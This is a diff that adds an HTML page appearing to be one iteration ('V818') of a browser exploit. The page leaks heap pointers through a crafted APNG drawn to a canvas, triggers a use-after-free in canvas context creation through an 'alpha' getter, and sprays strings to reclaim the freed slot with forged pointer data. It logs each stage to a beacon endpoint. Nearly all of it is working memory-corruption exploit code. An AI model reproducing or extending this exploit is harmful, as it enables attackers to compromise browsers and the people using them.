@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta http-equiv="refresh" content="150">
+<title>V818</title><style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style>
+</head><body><div id="log"></div><script>
+// V818: reclaim gate via save() counter at slot+0x250 -> string char 572.
+// Resolves: does a native binding survive after StringImpl reclaim of the 768B slot?
+var B=1,PRE='V818';
+function L(m){try{document.getElementById('log').innerHTML+=m+'<br>';}catch(e){}}
+function bk(st,ev,line,d){try{var s=('0'+B).slice(-2);B++;
+ new Image().src='/beacon/'+PRE+'-'+s+'-'+ev+'-'+st+'-L'+line+'?d='+encodeURIComponent(d)+'&t='+Date.now();
+ L(PRE+'-'+s+' '+ev+' '+st+' L'+line+' '+d);}catch(e){}}
+var APNG_B64='iVBORw0KGgoAAAANSUhEUgAAQAAAAAABCAAAAAAD9OmEAAAACGFjVEwAAAABAAAAALQt6aAAAAAnSURBVHja7cExAQAAAMKg9U9tDB+gAAAAAAAAAAAAAAAAAAAAgLsBQAEAAcB6fecAAAAaZmNUTAAAAAAAAAABAAAAAQAAAAAAAAAAAAEACgAAWn8w0AAAAA5mZEFUAAAAAXjaY/gPAAEBAQD3TaFIAAAAAElFTkSuQmCC';
+var FORBID={};[0x80,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x8B,0x8C,0x8E,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0x9B,0x9C,0x9E,0x9F].forEach(function(b){FORBID[b]=1;});
+function safe(v){var t=v;for(var i=0;i<8;i++){if(FORBID[t%256])return false;t=Math.floor(t/256);}return true;}
+function hex(v){v=Math.floor(v);var h='';for(var i=0;i<16;i++){h='0123456789abcdef'.charAt(v%16)+h;v=Math.floor(v/16);}return h;}
+var scanAll=[];
+function extractRGB(rgba,n){var h=new Uint8Array(n*3);for(var p=0;p<n;p++){h[p*3]=rgba[p*4];h[p*3+1]=rgba[p*4+1];h[p*3+2]=rgba[p*4+2];}return h;}
+function scanBuf(heap){var c=0;for(var q=0;q+7<heap.length;q+=8){
+ var lo=(heap[q]|(heap[q+1]<<8)|(heap[q+2]<<16)|((heap[q+3]<<24)>>>0))>>>0;
+ var hi=(heap[q+4]|(heap[q+5]<<8)|(heap[q+6]<<16)|((heap[q+7]<<24)>>>0))>>>0;
+ if(hi>=0x02&&hi<=0x0a){c++;if(safe(lo)&&safe(hi))scanAll.push(hi*4294967296+lo);}}
+ return c;}
+function leak(W,cb){var cv=document.createElement('canvas');cv.width=W;cv.height=1;
+ var cx=cv.getContext('2d');cx.fillStyle='#000';cx.fillRect(0,0,W,1);
+ var im=new Image();im.onload=function(){var id;
+  try{cx.drawImage(im,0,0);id=cx.getImageData(0,0,W,1);}catch(e){bk('S1','FAIL',29,e.message);cb(-1);return;}
+  var n=scanBuf(extractRGB(id.data,W));cv.width=1;cb(n);};
+ im.onerror=function(){bk('S1','FAIL',32,'decode');cb(-1);};
+ im.src='data:image/png;base64,'+APNG_B64;}
+function pick(){
+ var m={};for(var i=0;i<scanAll.length;i++){var b=Math.floor(scanAll[i]/1048576);m[b]=(m[b]||0)+1;}
+ var a=[];for(var k in m)a.push([parseInt(k,10),m[k]]);
+ a.sort(function(x,y){return y[1]-x[1];});
+ var ds='';for(var j=0;j<a.length&&j<5;j++)ds+='0x'+hex(a[j][0]*1048576)+':'+a[j][1]+' ';
+ bk('S1','PASS',36,'tot='+scanAll.length+'|'+ds);
+ var cand=null;
+ for(var q=0;q<a.length;q++){var base=a[q][0]*1048576;
+  if(base<0x200000000)continue;
+  if(base>=0x800000000&&base<0x803000000)continue;
+  cand=a[q];break;}
+ if(!cand){bk('S1','FAIL',42,'no-cluster');return null;}
+ var T=null;for(var off=0x4000;off<0x100000;off+=0x1000){var t=cand[0]*1048576+off;
+  if(safe(t)&&safe(t-0x30)){T=t;break;}}
+ if(T===null){bk('S1','FAIL',47,'no-safe-T');return null;}
+ bk('S1','PASS',49,'T=0x'+hex(T)+'|n='+cand[1]);
+ return T;}
+function forge(T){
+ // V818: precompute target and payload templates BEFORE the trigger, so the only allocations
+ // after the free are the reclaim carriers themselves.
+ // V818 target: only accept a vtable-family pointer, low12 == 0x850. Those are module data
+ // addresses, so the read target is guaranteed mapped even though the leak itself is stale heap.
+ var freq={};
+ for(var q=0;q<scanAll.length;q++){var vv=scanAll[q];
+  if(vv<=0x800000000)continue;
+  if((vv%4096)!==0x850)continue;
+  freq[vv]=(freq[vv]||0)+1;}
+ var best=null,bestc=0; for(var kk in freq){ if(freq[kk]>bestc){bestc=freq[kk];best=parseFloat(kk);} }
+ var T2=best; // may be null: the detector still runs, only the hypothetical read target is lost
+ var tpls=[];
+ {
+  var mb2=(T2===null)?0x1000:(T2-0x30), mh2=Math.floor(mb2/4294967296), ml2=mb2-mh2*4294967296;
+  for(var L0=744;L0<=744;L0+=8){
+   var b=new Uint8Array(L0);
+   b[0x70]=ml2%256;b[0x71]=Math.floor(ml2/256)%256;b[0x72]=Math.floor(ml2/65536)%256;b[0x73]=Math.floor(ml2/16777216)%256;
+   b[0x74]=mh2%256;b[0x75]=Math.floor(mh2/256)%256;b[0x76]=Math.floor(mh2/65536)%256;b[0x77]=Math.floor(mh2/16777216)%256;
+   b[0x78]=1;b[0x7C]=1;
+   tpls.push(b);
+  }
+ }
+ var outer=document.createElement('canvas');outer.width=1;outer.height=1;document.body.appendChild(outer);
+ var inner=null,d={};
+ Object.defineProperty(d,'alpha',{get:function(){
+   inner=outer.getContext('2d'); inner.lineWidth=9876.5432; return true;}});
+ try{outer.getContext('bitmaprenderer',d);}catch(e){}
+ var st=inner;if(!st){bk('S2','FAIL',60,'no-ctx');return;}
+ bk('S2','ENTER',62,'uaf-triggered|T=0x'+hex(T));
+ // V818: multi-class mixed spray, no canvas oracle. Whatever class matches reclaims with a
+ // payload whose State buffer points at a mapped leaked pointer; read lineWidth directly.
+ var dec=new TextDecoder('iso-8859-1'), keep2=[];
+ for(var rep=0;rep<40;rep++){ for(var ti=0;ti<tpls.length;ti++) keep2.push(dec.decode(tpls[ti])); }
+ window.__keep2=keep2;
+ bk('S3','PASS',74,'class768|n='+keep2.length+'|c='+bestc+'|T='+(T2===null?'null':('0x'+hex(T2))));
+ // V818 detector: after the class-768 string spray, allocate live contexts with marker lineWidth.
+ // 5000+i means a context still reclaimed the slot, so the string spray failed. A crash means the
+ // string took the slot and binding on the string-reclaimed object faults.
+ var seeds=[];
+ for(var ci2=0;ci2<400;ci2++){
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  try{ var cx=cv.getContext('2d'); cx.lineWidth=5000+ci2; seeds.push(cx); }catch(e2){}
+ }
+ window.__seeds=seeds;
+ try{var lw=st.lineWidth; bk('S4','PASS',91,'detector|lw='+String(lw)+'|seeds='+seeds.length);}
+ catch(e){bk('S4','FAIL',92,'det:'+(e.message||e));}
+ bk('S5','PASS',100,'done');
+}
+try{
+ bk('S0','ENTER',103,'v818|gate572');
+ var hb=0,hbi=setInterval(function(){hb++;bk('HB','PASS',105,'hb='+hb);},25000);
+ var Ws=[16384,8192],i=0;
+ function step(){ if(i>=Ws.length){var T=pick();clearInterval(hbi);if(T)forge(T);else bk('S1','FAIL',110,'no-target');return;}
+  var W=Ws[i++];leak(W,function(n){bk('S1','PASS',113,'W='+W+'|raw='+n);setTimeout(step,30);});}
+ step();
+}catch(e){bk('S0','FAIL',117,String(e&&e.message||e));}
+</script></body></html>
